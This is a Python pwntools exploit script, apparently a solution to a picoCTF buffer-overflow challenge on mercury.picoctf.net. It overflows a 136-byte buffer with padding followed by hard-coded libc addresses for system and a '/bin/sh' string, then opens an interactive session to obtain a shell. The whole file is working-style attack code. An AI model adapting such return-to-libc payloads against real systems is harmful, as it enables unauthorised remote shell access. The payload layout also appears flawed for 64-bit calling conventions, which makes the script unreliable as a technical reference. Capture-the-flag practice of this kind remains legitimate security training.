#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

#nc mercury.picoctf.net 23584
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 23584)

    return r


def main():
    r = conn()
    system = p64(0x7ffff784f4e0).decode()
    bin_sh = p64(0x7ffff79b40fa).decode()
    pld = ("A"*136)
    pld += system
    pld += bin_sh

    r.sendline(pld)
    r.interactive()


if __name__ == "__main__":
    main()

